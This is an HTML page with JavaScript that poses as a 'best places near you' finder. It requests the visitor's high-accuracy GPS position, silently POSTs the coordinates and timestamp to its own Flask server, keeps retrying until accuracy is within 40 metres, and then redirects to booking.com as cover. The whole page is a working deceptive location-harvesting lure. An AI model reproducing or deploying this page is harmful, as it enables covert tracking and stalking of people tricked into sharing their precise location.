<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GPS Location Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 2em;
      background-color: #f9f9f9;
}

    h1 {
      font-size: 1.8em;
      margin-bottom: 0.5em;
}

    #status {
      margin-top: 1em;
      font-size: 1.2em;
      color: #333;
}

    #spinner {
      margin: 2em auto;
      width: 50px;
      height: 50px;
      border: 6px solid #ccc;
      border-top: 6px solid #007BFF;
      border-radius: 50%;
      animation: spin 1s linear infinite;
}

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
}

    button {
      padding: 0.6em 1.2em;
      font-size: 1em;
      margin-top: 1em;
      background-color: #007BFF;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
}

    button:hover {
      background-color: #0056b3;
}
  </style>
</head>
<body>
  <h1>üìçFinding Best Places Near You</h1>
  <div id="spinner"></div>
  <p id="status"></p>

  <script>
    const statusEl = document.getElementById('status');
    const spinnerEl = document.getElementById('spinner');

    function updateStatus(message, isError = false) {
      statusEl.textContent = message;
      statusEl.style.color = isError? 'red': '#333';
}

    function showRetryButton() {
      const btn = document.createElement('button');
      btn.textContent = "Retry For Place Detection";
      btn.onclick = () => {
        btn.remove();
        statusEl.textContent = "";
        spinnerEl.style.display = "block";
        detectLocation();
};
      document.body.appendChild(btn);
}

    function detectLocation() {
      updateStatus("Allow GPS to find best places near you...");
      navigator.geolocation.getCurrentPosition(
        function(position) {
          spinnerEl.style.display = 'none';
          const accuracy = position.coords.accuracy;
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          updateStatus(`Location found! Accuracy: ${Math.round(accuracy)} meters`);

          // Send data to Flask server
          fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json'},
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              accuracy: accuracy,
              timestamp: Date.now()
})
});

          // Redirect if accuracy is good enough
          if (accuracy <= 40) {
            updateStatus("Places Found Near You. Connecting...");
            setTimeout(() => {
              window.location.href = "https://www.booking.com";
}, 1500);
} else {
            alert(`Your location accuracy is ${Math.round(accuracy)} meters.\n\nPlease move to an open area or enable GPS for better precision.`);
            showRetryButton();
}
},
        function(error) {
          spinnerEl.style.display = 'none';
          switch (error.code) {
            case error.PERMISSION_DENIED:
              updateStatus("Permission denied. Please click 'Allow' when prompted and ensure GPS is turned on.", true);
              alert("‚ö†Ô∏è Location access denied.\n\nPlease:\n1. Turn on GPS/location services.\n2. Click 'Allow' when prompted.\n3. Retry.");
              break;
            case error.POSITION_UNAVAILABLE:
              updateStatus("Location unavailable. Try moving to an open area.", true);
              alert("‚ö†Ô∏è Location unavailable.\n\nTry moving outdoors or enabling GPS.");
break;
            case error.TIMEOUT:
              updateStatus("May Be an Internet Issue Please Move your mobile to right place and ensure proper Connection.", true);
              alert("‚ö†Ô∏è May be an Internet Issue. Please ensure proper internet");
              break;
            default:
              updateStatus("An unknown error occurred while retrieving location.", true);
              alert("‚ö†Ô∏è Unknown error.\n\nPlease check your device settings and try again.");
}
          showRetryButton();
},
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
}
);
}

    // Start detection on page load
    detectLocation();
  </script>
</body>
</html>
